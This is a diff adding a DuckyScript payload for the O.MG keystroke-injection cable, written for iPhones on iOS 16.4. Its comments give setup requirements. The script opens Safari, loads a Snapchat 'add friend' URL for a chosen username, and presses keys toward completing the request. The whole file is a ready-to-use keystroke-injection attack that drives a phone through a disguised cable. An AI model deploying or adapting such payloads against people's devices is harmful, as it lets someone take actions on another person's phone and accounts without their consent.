@@ -1,0 +1,57 @@
+REM Version 1.0
+
+REM OS: iOS
+
+REM Author: Peaakss / Peaks
+REM -----------------------------------------------
+REM READ THIS BEFORE USING PAYLOAD
+
+REM Description: This payload uses a URL scheme to quickly navigate to a user profile on snapchat and add them as a friend
+
+REM NOTICE Payload was made on iOS 16.4 - iPhone | Timing may have have to be changed based on version/model
+
+REM NOTICE Lighting to USB-A or USB-C camera adapter is needed to run this payload, active end of the O.MG cable must be plugged into the end of the adapter, the lighting end is displayed on the sales page before purchasing the O.MG cable, a adapter is needed because there is no lightning active end
+
+REM NOTICE This payload needs Full Keyboard Access to enabled on the device
+
+REM NOTICE you will need to phyiscal add the friend at the end of the payload
+
+REM NOTICE make sure to replace "Snap chat User" with the username of the profile you want to friend
+
+REM -----------------------------------------------
+
+
+DEFINE #USERNAME "Snap chat User"
+DEFINE #URL snapchat://add/#USERNAME
+
+FUNCTION MAIN()
+DELAY 1000
+GUI h
+DELAY 250
+GUI h
+DELAY 500
+GUI SPACE
+DELAY 1500
+STRING Safari
+DELAY 1000
+ENTER
+DELAY 500
+GUI n
+DELAY 500
+GUI l
+DELAY 250
+STRING #URL
+DELAY 2000
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+SPACE
+DELAY 100
+RIGHTARROW
+DELAY 1000
+SPACE
+DELAY 1500
+END_FUNCTION
+
+MAIN()
